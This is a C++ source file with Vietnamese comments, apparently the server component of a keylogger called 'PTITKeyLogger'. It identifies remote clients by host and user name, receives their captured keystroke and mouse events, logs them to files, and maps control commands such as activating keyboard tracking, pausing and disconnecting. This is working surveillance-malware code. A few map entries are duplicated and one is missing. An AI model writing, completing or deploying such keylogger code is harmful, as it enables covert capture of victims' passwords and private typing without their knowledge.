#include "DataHandler.hpp"
#include "DataWriter.hpp"
#include "KeystrokeData.hpp"
#include "MouseData.hpp"
#include "StatusData.hpp"
#include <iostream>

using namespace std;

void DataHandler::feedFactory(){
    //Mỗi loại đối tượng IData đc tạo ra bằng cách sử dụng make_shared<>
    _factory.feedCreator(static_cast<int32_t>(PTITKeyLogger::VALID_KEY_EVENT),
                        make_shared<KeystrokeData>()); /* Tạo 1 đối tượng KeystrokeData và
                        trả về 1 con trỏ thống minh đến đối tượng này*/

    /* Mỗi đối tượng IData đc thêm vào _factory thông qua hàm feedCreator
    vd make_shared<KeystrokeData>() thêm 1 đối tượng KeystrokeData vào _factory
    và ánh xạ nó với mã yêu cầu tương ứng*/
    
    _factory.feedCreator(static_cast<int32_t>(PTITKeyLogger::VALID_MOUSE_EVENT),
                        make_shared<MouseData>());

    _factory.feedCreator(static_cast<int32_t>(PTITKeyLogger::VALID_GET_STATUS_RESPONSE),
                        make_shared<StatusData>());
}
/*Tạo 1 map mỗi mã yêu cầu sẽ ánh xạ với 1 tin nhắn yêu cầu và hàm xử lý 
tương ứng, nếu có*/
void DataHandler::feedDataMaps(){
    _requestHandler = {
        {PTITKeyLogger::VALID_PING_RESPONSE, &DataHandler::handleIdResponse},
        {PTITKeyLogger::VALID_KEY_EVENT, &DataHandler::dumpData},
        {PTITKeyLogger::VALID_MOUSE_EVENT, &DataHandler::dumpData},
        {PTITKeyLogger::VALID_GET_STATUS_RESPONSE, &DataHandler::dumpData}
    };

    _mapRequestMessage = {
        {PTITKeyLogger::VALID_ASK_ID_RESPONSE,
        to_string(PTITKeyLogger::VALID_PING_RESPONSE) + " : VALID_PING_RESPONSE"},
        
        {PTITKeyLogger::VALID_KEYBOARD_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::VALID_KEYBOARD_TRACK_ACTIVATE) + " : VALID_KEYBOARD_TRACK_ACTIVATE"},

        {PTITKeyLogger::VALID_KEYBOARD_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::VALID_KEYBOARD_TRACK_DEACTIVATE) + " : VALID_KEYBOARD_TRACK_DEACTIVATE"},

        {PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_ACTIVATE) + " : VALID_MOUSE_MVMT_TRACK_ACTIVATE"},

        {PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE) + " : VALID_MOUSE_CLICK_TRACK_DEACTIVATE"},

        {PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_ACTIVATE) + " : VALID_MOUSE_CLICK_TRACK_ACTIVATE"},
        
        {PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE) + " : VALID_MOUSE_CLICK_TRACK_DEACTIVATE"},

        {PTITKeyLogger::VALID_DISCONNECT,
        to_string(PTITKeyLogger::VALID_DISCONNECT) + " : VALID_DISCONNECT"},

        {PTITKeyLogger::VALID_ASK_ID_RESPONSE,
        to_string(PTITKeyLogger::VALID_PING_RESPONSE) + " : VALID_PING_RESPONSE"},

        {PTITKeyLogger::VALID_PAUSE_ACTIVATE,
        to_string(PTITKeyLogger::VALID_PAUSE_ACTIVATE) + " : VALID_PAUSE_ACTIVATE"},

        {PTITKeyLogger::VALID_PAUSE_DEACTIVATE,
        to_string(PTITKeyLogger::VALID_PAUSE_DEACTIVATE) + " : VALID_PAUSE_DEACTIVATE"},
        
        {PTITKeyLogger::SET_FREQUENCY,
        to_string(PTITKeyLogger::SET_FREQUENCY) + " : SET_FREQUENCY"},

        {PTITKeyLogger::ERROR_PING,
        to_string(PTITKeyLogger::ERROR_PING) + " : ERROR_PING"},

        {PTITKeyLogger::ERROR_ASK_ID,
        to_string(PTITKeyLogger::ERROR_ASK_ID) + " : ERROR_ASK_ID"},

        {PTITKeyLogger::ERROR_KEYBOARD_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::ERROR_KEYBOARD_TRACK_ACTIVATE) + " : ERROR_KEYBOARD_TRACK_ACTIVATE"},

        {PTITKeyLogger::ERROR_KEYBOARD_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::ERROR_KEYBOARD_TRACK_DEACTIVATE) + " : ERROR_KEYBOARD_TRACK_DEACTIVATE"},

        {PTITKeyLogger::ERROR_MOUSE_MVMT_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::ERROR_MOUSE_MVMT_TRACK_ACTIVATE) + " : ERROR_MOUSE_MVMT_TRACK_ACTIVATE"},

        {PTITKeyLogger::ERROR_MOUSE_MVMT_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::ERROR_MOUSE_MVMT_TRACK_DEACTIVATE) + " : ERROR_MOUSE_MVMT_TRACK_DEACTIVATE"},

        {PTITKeyLogger::ERROR_MOUSE_CLICK_TRACK_ACTIVATE,
        to_string(PTITKeyLogger::ERROR_MOUSE_CLICK_TRACK_ACTIVATE) + " : ERROR_MOUSE_CLICK_TRACK_ACTIVATE"},

        {PTITKeyLogger::ERROR_MOUSE_CLICK_TRACK_DEACTIVATE,
        to_string(PTITKeyLogger::ERROR_MOUSE_CLICK_TRACK_DEACTIVATE) + " : ERROR_MOUSE_CLICK_TRACK_DEACTIVATE"},

        {PTITKeyLogger::ERROR_DISCONNECT,
        to_string(PTITKeyLogger::ERROR_DISCONNECT) + " : ERROR_DISCONNECT"},

        {PTITKeyLogger::ERROR_PAUSE_ACTIVATE,
        to_string(PTITKeyLogger::ERROR_PAUSE_ACTIVATE) + " : ERROR_PAUSE_ACTIVATE"},

        {PTITKeyLogger::ERROR_PAUSE_DEACTIVATE,
        to_string(PTITKeyLogger::ERROR_PAUSE_DEACTIVATE) + " : ERROR_PAUSE_DEACTIVATE"},

        {PTITKeyLogger::ERROR_SET_FREQUENCY,
        to_string(PTITKeyLogger::ERROR_SET_FREQUENCY) + " : ERROR_SET_FREQUENCY"},

         {PTITKeyLogger::ERROR_GET_STATUS,
        to_string(PTITKeyLogger::ERROR_GET_STATUS) + " : ERROR_GET_STATUS"}
    };
}

DataHandler::DataHandler(){
    feedDataMaps();
    feedFactory();
}
/* handleData
    + nhận id của client và dữ liệu từ client
    + xác định loại yêu cầu bằng cách trích xuất mã yêu cầu từ dữ liệu
    +gọi treatID(id) để xử lý id của client
    + Kiểm tra xem có hàm xử lý nào đc đăng ký cho mã yêu cầu ko, nếu ko ko gọi
    + printCodeRespone để báo cáo rằng mã yêu cầu đc xử lý (hoặc chưa đc xử lý).
    Nếu có, gọi hàm
    xử lý tương ứng từ _requestHandler
*/
void DataHandler::handleData(const int &id, const vector<char> &data){
    PTITKeyLogger::RequestCode requestNumber = 
        *(reinterpret_cast<const PTITKeyLogger::RequestCode *>(&data[0]));
    treatID(id);

    if(_requestHandler.find(requestNumber) == _requestHandler.end())
        printCodeRespose(id, {_mapClient[id].first, _mapClient[id].second},
            data);

    else
        _requestHandler[requestNumber](
            *this, id, {_mapClient[id].first, _mapClient[id].second}, data);
}

/* Kiểm tra xem id của client đã thiết lập chưa nếu chưa nó sẽ gán id với giá
trị mặc định*/
void DataHandler::treatID(const int &id){
    auto it = _mapClient.find(id);
    if (it == _mapClient.end())
        _mapClient[id] = {"", ""};
}

/* Kiểm tra id của client đã đc thiết lập chưa */
bool DataHandler::isIDSet(const int &id){
    return (_mapClient[id].first.size() + _mapClient[id].second.size() == 0
            ? false
            : true);
}

/* handleIdResponse
    + Xử lý phản hồi từ yêu cầu VALID_ASK_ID_RESPONSE của client.
    + Trích xuất host và user từ dữ liệu.
    + Cập nhật thông tin về client trong _mapClients.
    + In ra màn hình thông tin về phản hồi.
*/
void DataHandler::handleIdResponse(
    const int &id, const pair<string, string> & /* hostUser */,
    const vector<char> &data){
    
    if(data.size() < sizeof(int32_t) + sizeof(char[256]) + sizeof(char[256])){
        cerr << "Invalid Packet size for VALID_ASK_ID_RESPONSE."<<endl;
        return;
    }

    _mapClient[id].first = 
        string(reinterpret_cast<const char *>(&data[sizeof(int32_t)]));
    
    _mapClient[id].second = string(reinterpret_cast<const char *>(
        &data[sizeof(int32_t) + sizeof(char[256])]));
    
    cout << static_cast<int32_t>(PTITKeyLogger::VALID_ASK_ID_RESPONSE)
        <<" : VALID_ASK_ID_RESPONSE -- host" <<_mapClient[id].first
        <<"user = "<< _mapClient[id].second << endl;
    
    cout << "server >> "<< flush;

    }

/* dumpData
    + Xử lý dữ liệu từ các yêu cầu như VALID_GET_STATUS_RESPONSE, VALID_KEY_EVENT, và VALID_MOUSE_EVENT.
    + Tạo một đối tượng IData từ dữ liệu sử dụng _factory.
    + Ghi dữ liệu vào tệp tin sử dụng DataWriter.
    + Gọi dump() để in ra thông tin về dữ liệu. \
*/
void DataHandler::dumpData(const int & /* id */,
                            const pair<string, string> &hostUser,
                            const vector<char> &data){
    PTITKeyLogger::RequestCode requestNumber = 
            *(reinterpret_cast<const PTITKeyLogger::RequestCode *>(&data[0]));

    static DataWriter writer;

    if(requestNumber == PTITKeyLogger::VALID_GET_STATUS_RESPONSE){
        cout << hostUser.first << "@" << hostUser.second << " -- "
            << static_cast<int32_t>(PTITKeyLogger::VALID_GET_STATUS_RESPONSE)
            << " : VALID_GET_STATUS_RESPONSE" << endl;
            cout<<"server >> " << flush;
    }

    shared_ptr<IData> dataObj = 
        _factory.createInstance(static_cast<int32_t>(requestNumber), data);

    writer.writeData(hostUser.first, hostUser.second, dataObj->getData());
    dataObj->dump();
}

//In ra thông tin về yêu cầu đc xử lý (hoặc ko đc xử lý) bởi server
void DataHandler::printCodeRespose(
    const int & /* id */, const pair<string, string> &hostUser,
    const vector<char> &data) {
        PTITKeyLogger::RequestCode requestNumber = 
            *(reinterpret_cast<const PTITKeyLogger::RequestCode *>(&data[0]));

        if(_mapRequestMessage.find(requestNumber) == _mapRequestMessage.end())
            cout << hostUser.first << "@" << hostUser.second << " -- "
            << static_cast<int32_t>(requestNumber)
            << ": Request code not handled by this server." << endl;
        else{
            cout << hostUser.first << "@" << hostUser.second << " -- "
                << static_cast<int32_t>(requestNumber) << ": "
                <<_mapRequestMessage[requestNumber] << "receive."
                << endl;
            
            cout << "server >> "<<flush;
        }
    }